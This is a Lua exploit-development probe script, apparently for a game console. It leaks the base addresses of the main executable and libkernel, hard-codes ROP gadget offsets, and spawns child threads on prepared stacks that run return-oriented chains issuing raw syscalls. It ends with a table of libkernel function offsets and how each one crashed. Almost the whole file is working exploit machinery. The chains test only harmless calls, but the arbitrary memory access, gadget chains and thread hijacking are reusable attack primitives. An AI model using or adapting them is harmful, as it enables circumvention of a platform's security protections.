-- CRASH_CLASS: LOW
-- PROBE 591: Test libkernel code offsets via child thread ROP
--
-- v8: SAFE TESTS ONLY. Library function calls crash children → process death.
-- Tests:
--   1: getpid via child syscall (control)
--   2: nanosleep(0) via syscall 240
--   3: write(2) via syscall (data channel test)
--   4: clock_gettime via syscall 232

print("=== PROBE 591: LK CODE DRAIN VIA CHILD ROP (v7) ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt64(val)
    local h, l = get_hi_lo(val)
    return string.format("0x%X%08X", h, l)
end
local function to_num64(h, l) return h * 0x100000000 + l end
local function mk_u64(hi, lo)
    return uint64(string.format("0x%X%08X", hi, lo))
end

local stub = syscall.pipe.fn_addr
local function sc(num, ...) return native.fcall_with_rax(stub, num, ...) end

local pid = N(sc(20))
print("pid=" .. pid)
local function alive() return N(sc(20)) == pid end

-- ============================================================
-- A: Eboot base + gadgets
-- ============================================================
print("")
print("--- A: EBOOT ---")

local info = memory.alloc(0x200)
for i = 0, 0x1FF, 4 do wd(N(info) + i, 0) end
wd(N(info), 0x160)
pcall(function() sc(593, uint64(0), info) end)

local tlo = rd(N(info) + 0x108) or 0
local thi = rd(N(info) + 0x10C) or 0
if tlo < 0 then tlo = tlo + 0x100000000 end
if thi < 0 then thi = thi + 0x100000000 end
local eb = mk_u64(thi, tlo)
print("  eboot=" .. fmt64(eb))

local pop_rax_ret     = eb + uint64(0x992)
local pop_rdi_ret     = eb + uint64(0xC9DFE)
local pop_rsi_ret     = eb + uint64(0xD77D)
local mov_rdi_rax_ret = eb + uint64(0x92C67)
local bare_ret        = eb + uint64(0x42)

-- ============================================================
-- B: Find libkernel base via 674
-- ============================================================
print("")
print("--- B: LIBKERNEL ---")

local STRIDE = 72
local vmbuf = memory.alloc(STRIDE * 400 + 0x100)
local countp = memory.alloc(16)
wd(N(countp), 0)

pcall(function()
    sc(674, uint64(N(vmbuf)), uint64(STRIDE), uint64(400),
       uint64(N(countp)), uint64(0x40000000))
end)

local nregions = rd(N(countp)) or 0
local fn_h, fn_l = get_hi_lo(stub)
local fn_num = to_num64(fn_h, fn_l)
local lk_base_u64, lk_base_num, lk_size

for i = 0, math.min(nregions - 1, 500) do
    local base = N(vmbuf) + i * STRIDE
    local slo = rd(base) or 0; local shi = rd(base + 4) or 0
    if slo < 0 then slo = slo + 0x100000000 end
    if shi < 0 then shi = shi + 0x100000000 end
    local elo = rd(base + 8) or 0; local ehi = rd(base + 12) or 0
    if elo < 0 then elo = elo + 0x100000000 end
    if ehi < 0 then ehi = ehi + 0x100000000 end
    local s = to_num64(shi, slo); local e = to_num64(ehi, elo)
    if fn_num >= s and fn_num < e then
        lk_base_num = s; lk_size = e - s
        lk_base_u64 = mk_u64(shi, slo)
        print(string.format("  lk_base=0x%X size=0x%X", s, e - s))
        break
    end
end

if not lk_base_u64 then print("  NOT FOUND"); return end

-- ============================================================
-- C: Shared resources + pre-allocate stacks
-- ============================================================
print("")
print("--- C: SETUP ---")

local result_raw = memory.alloc(0x100)
local rr_h, rr_l = get_hi_lo(result_raw)
local result_u64 = mk_u64(rr_h, rr_l)
local result_num = N(result_raw)

local tcb_raw = memory.alloc(0x1000)
local tcb_h, tcb_l = get_hi_lo(tcb_raw)
local tcb_u64 = mk_u64(tcb_h, tcb_l)
for i = 0, 0xFFF, 8 do wq(N(tcb_raw) + i, tcb_u64) end

local MMAP_SIZE = 0x200000
local THR_STACK = 0x1FF000
local NUM_STACKS = 4
local stacks = {}
for i = 1, NUM_STACKS do
    local ok_m, cs = pcall(function()
        return sc(477, uint64(0), uint64(MMAP_SIZE), uint64(0x3),
                  uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    if not ok_m or N(cs) == 0 then print("  mmap " .. i .. " FAIL"); return end
    local sh, sl = get_hi_lo(cs)
    stacks[i] = { num = N(cs), u64 = mk_u64(sh, sl) }
end

print(string.format("  stacks=%d result=%s stub=%s", NUM_STACKS, fmt64(result_u64), fmt64(stub)))

local next_stack = 1

local function spawn_child(chain, test_name)
    if next_stack > NUM_STACKS then print("  NO STACKS"); return false end
    local st = stacks[next_stack]; next_stack = next_stack + 1

    local aligned_top = math.floor((st.num + THR_STACK) / 16) * 16
    local rsp = aligned_top - 8
    for idx, word in ipairs(chain) do wq(rsp + (idx - 1) * 8, word) end

    local param = memory.alloc(0x100)
    for i = 0, 0x3F, 4 do wd(N(param) + i, 0) end
    wq(N(param) + 0x00, pop_rax_ret)
    wq(N(param) + 0x08, uint64(0))
    wq(N(param) + 0x10, st.u64)
    wq(N(param) + 0x18, uint64(THR_STACK))
    local tid_buf = memory.alloc(16)
    wq(N(tid_buf), uint64(0))
    wq(N(param) + 0x30, tid_buf)

    local ok_t, rv_t = pcall(function()
        return sc(455, param, uint64(0x38))
    end)
    if not ok_t then
        print("  " .. test_name .. " FAIL: " .. tostring(rv_t)); return false
    end
    local tid = rd(N(tid_buf)) or 0
    if tid < 0 then tid = tid + 0x100000000 end
    print(string.format("  %s rv=%d tid=%d", test_name, N(rv_t), tid))
    return true
end

local function wait_result(offset, sentinel_lo, sentinel_hi, max_attempts)
    for attempt = 1, (max_attempts or 100) do
        local r = rq(result_num + offset)
        if r then
            local rh, rl = get_hi_lo(r)
            if rh ~= sentinel_hi or rl ~= sentinel_lo then
                return r, attempt
            end
        end
        for w = 1, 2000 do end
    end
    return nil, 0
end

-- ============================================================
-- D: TEST 1 — getpid (control)
-- ============================================================
print("")
print("--- D: getpid (control) ---")

wq(result_num, mk_u64(0xDEAD, 0xCAFECAFE))

if spawn_child({
    uint64(165), pop_rdi_ret, uint64(129), pop_rsi_ret, tcb_u64, stub,
    pop_rax_ret, uint64(20), stub,
    pop_rdi_ret, result_u64, mov_rdi_rax_ret,
    pop_rdi_ret, uint64(0), pop_rax_ret, uint64(431), stub,
}, "getpid") then
    local r, att = wait_result(0, 0xCAFECAFE, 0xDEAD)
    if r then
        local rh, rl = get_hi_lo(r)
        if rh == 0 and rl == pid then
            print("  PASS: child_pid=" .. rl)
        else
            print("  RESULT: " .. fmt64(r) .. " (expected " .. pid .. ")")
        end
    else
        print("  TIMEOUT")
    end
end

if not alive() then print("DEAD"); return end

-- ============================================================
-- E: TEST 2 — nanosleep(240) via syscall
-- ============================================================
print("")
print("--- E: nanosleep(240) syscall ---")

local ts_buf = memory.alloc(32)
wq(N(ts_buf), uint64(0)); wq(N(ts_buf) + 8, uint64(0))
local ts_h, ts_l = get_hi_lo(ts_buf)
local ts_u64 = mk_u64(ts_h, ts_l)

wq(result_num + 8, mk_u64(0xDEAD, 0xCAFECAFE))

if spawn_child({
    uint64(165), pop_rdi_ret, uint64(129), pop_rsi_ret, tcb_u64, stub,
    pop_rax_ret, uint64(240), pop_rdi_ret, ts_u64, pop_rsi_ret, uint64(0), stub,
    pop_rdi_ret, result_u64 + uint64(8), mov_rdi_rax_ret,
    pop_rdi_ret, uint64(0), pop_rax_ret, uint64(431), stub,
}, "nsleep") then
    local r, att = wait_result(8, 0xCAFECAFE, 0xDEAD)
    if r then
        local rh, rl = get_hi_lo(r)
        if rh == 0 and rl == 0 then
            print("  PASS: nanosleep(0)=0")
        else
            print("  RESULT: " .. fmt64(r))
        end
    else
        print("  TIMEOUT")
    end
end

if not alive() then print("DEAD"); return end

-- ============================================================
-- F: TEST 3 — write to socketpair via child syscall
-- ============================================================
print("")
print("--- F: child write(4) via socketpair ---")

local sv = memory.alloc(16)
wq(N(sv), uint64(0))
local sv_h, sv_l = get_hi_lo(sv)
local sv_u64 = mk_u64(sv_h, sv_l)

local ok_sp, rv_sp = pcall(function()
    return sc(135, uint64(1), uint64(2), uint64(0), sv_u64)
end)
local fd_r = rd(N(sv)) or 0; if fd_r < 0 then fd_r = fd_r + 0x100000000 end
local fd_w = rd(N(sv) + 4) or 0; if fd_w < 0 then fd_w = fd_w + 0x100000000 end
print("  socketpair ret=" .. (ok_sp and N(rv_sp) or "err") .. " fds=" .. fd_r .. "," .. fd_w)

local msg_buf = memory.alloc(32)
wq(N(msg_buf), uint64(0x4141414142424242))
local msg_h, msg_l = get_hi_lo(msg_buf)
local msg_u64 = mk_u64(msg_h, msg_l)

wq(result_num + 16, mk_u64(0xDEAD, 0xCAFECAFE))

local pop_rdx_ret = eb + uint64(0x3B02D7)

if spawn_child({
    uint64(165), pop_rdi_ret, uint64(129), pop_rsi_ret, tcb_u64, stub,
    pop_rax_ret, uint64(4), pop_rdi_ret, uint64(fd_w), pop_rsi_ret, msg_u64,
    pop_rdx_ret, uint64(8), stub,
    pop_rdi_ret, result_u64 + uint64(16), mov_rdi_rax_ret,
    pop_rdi_ret, uint64(0), pop_rax_ret, uint64(431), stub,
}, "write") then
    local r, att = wait_result(16, 0xCAFECAFE, 0xDEAD)
    if r then
        local rh, rl = get_hi_lo(r)
        print("  write ret=" .. rl)
        if rl == 8 then
            local rbuf = memory.alloc(32)
            local ok_rd, rv_rd = pcall(function()
                return sc(3, uint64(fd_r), rbuf, uint64(8))
            end)
            if ok_rd then
                local v = rq(N(rbuf))
                if v then
                    print("  read=" .. fmt64(v))
                    local vh, vl = get_hi_lo(v)
                    if vh == 0x41414141 and vl == 0x42424242 then
                        print("  PASS: child wrote 8 bytes via socketpair")
                    end
                end
            end
        end
    else
        print("  TIMEOUT")
    end
end

if not alive() then print("DEAD"); return end

-- ============================================================
-- G: TEST 4 — clock_gettime(232) via child syscall
-- ============================================================
print("")
print("--- G: clock_gettime(232) ---")

local clk_buf = memory.alloc(32)
wq(N(clk_buf), uint64(0)); wq(N(clk_buf) + 8, uint64(0))
local clk_h, clk_l = get_hi_lo(clk_buf)
local clk_u64 = mk_u64(clk_h, clk_l)

wq(result_num + 24, mk_u64(0xDEAD, 0xCAFECAFE))

if spawn_child({
    uint64(165), pop_rdi_ret, uint64(129), pop_rsi_ret, tcb_u64, stub,
    pop_rax_ret, uint64(232), pop_rdi_ret, uint64(0), pop_rsi_ret, clk_u64, stub,
    pop_rdi_ret, result_u64 + uint64(24), mov_rdi_rax_ret,
    pop_rdi_ret, uint64(0), pop_rax_ret, uint64(431), stub,
}, "clkget") then
    local r, att = wait_result(24, 0xCAFECAFE, 0xDEAD)
    if r then
        local rh, rl = get_hi_lo(r)
        print("  clock_gettime ret=" .. rl)
        local sec = rq(N(clk_buf))
        if sec then print("  sec=" .. fmt64(sec)) end
        if rl == 0 then
            print("  PASS: clock_gettime from child")
        end
    else
        print("  TIMEOUT")
    end
end

if not alive() then print("DEAD"); return end

-- ============================================================
-- H: Range summary
-- ============================================================
print("")
print("--- H: SUMMARY ---")
print(string.format("  lk: 0x%X sz=0x%X", lk_base_num, lk_size))

local OFFSETS = {
    {name="sceKernelGetCurrentCpu", off=0x1200,  note="WRONG (p590)"},
    {name="worker_wait_return",     off=0x1FD01, note="UNTESTABLE-XO child crash kills process"},
    {name="pthread_create_name_np", off=0x21890, note="UNTESTABLE-XO"},
    {name="pthread_join",           off=0x229A0, note="UNTESTABLE-XO"},
    {name="pthread_exit",           off=0x21C20, note="CRASH v7/v8 child dies on entry"},
    {name="sleep",                  off=0x27F00, note="CRASH v6 child dies on entry"},
}

for _, o in ipairs(OFFSETS) do
    print(string.format("  +0x%05X %-25s %s [%s]",
        o.off, o.name,
        (o.off < lk_size) and "IN" or "OUT",
        o.note))
end

print("")
print("canary=" .. tostring(alive()))
print("=== PROBE 591 COMPLETE ===")
